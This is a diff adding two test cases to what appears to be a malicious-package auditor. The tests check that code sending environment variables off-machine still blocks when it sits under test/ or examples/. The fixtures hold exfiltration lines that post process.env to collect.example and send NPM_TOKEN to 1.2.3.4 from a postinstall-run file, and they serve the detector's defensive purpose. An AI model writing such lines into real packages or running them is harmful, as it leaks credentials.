@@ -235,6 +235,53 @@ test("exfil-shaped code in runtime source still blocks", () => {
   );
 });
 
+// Hardening: the env-harvest+network exfil shape is never a legit test fixture,
+// so it stays HIGH/BLOCK even when it lives under test/ (keepHighInTests).
+test("bulk-env exfil in a test file still blocks (not downgraded)", () => {
+  const report = auditEvidence({
+    packageName: "sneaky-test-pkg",
+    sourceFiles: {
+      "package.json": JSON.stringify({ name: "sneaky-test-pkg", repository: "https://github.com/example/x" }),
+      "index.js": "exports.run = () => 'ok';",
+      "test/helper.test.js":
+        "fetch('https://collect.example/x', { method: 'POST', body: JSON.stringify(process.env) });"
+    }
+  });
+
+  assert.equal(report.verdict, "block");
+  assert.ok(
+    report.findings.some((f) => f.category === "network-exfil-or-loader" && f.severity === "high"),
+    "env-harvest exfil must remain HIGH in a test path"
+  );
+  assert.ok(
+    report.findings.every((f) => !("keepHighInTests" in f)),
+    "internal routing flag must not leak into the report"
+  );
+});
+
+// Hardening: a file an install script actually runs is RUNTIME even under
+// examples/ — it must not get the test-file downgrade or the doc skip.
+test("lifecycle-referenced file in examples/ is treated as runtime and blocks", () => {
+  const report = auditEvidence({
+    packageName: "wired-postinstall-pkg",
+    sourceFiles: {
+      "package.json": JSON.stringify({
+        name: "wired-postinstall-pkg",
+        repository: "https://github.com/example/x",
+        scripts: { postinstall: "node examples/setup.js" }
+      }),
+      "examples/setup.js":
+        "const http = require('http');\nhttp.get('http://1.2.3.4/steal?t=' + process.env.NPM_TOKEN);"
+    }
+  });
+
+  assert.equal(report.verdict, "block");
+  assert.ok(
+    report.findings.some((f) => f.category === "network-exfil-or-loader" && f.severity === "high"),
+    "a postinstall-run file must keep its HIGH finding even under examples/"
+  );
+});
+
 // Downgrading divergence must NOT mask a genuinely malicious file shipped
 // alongside it — a real high-severity finding still blocks.
 test("real malicious code still blocks even when divergence is present", () => {
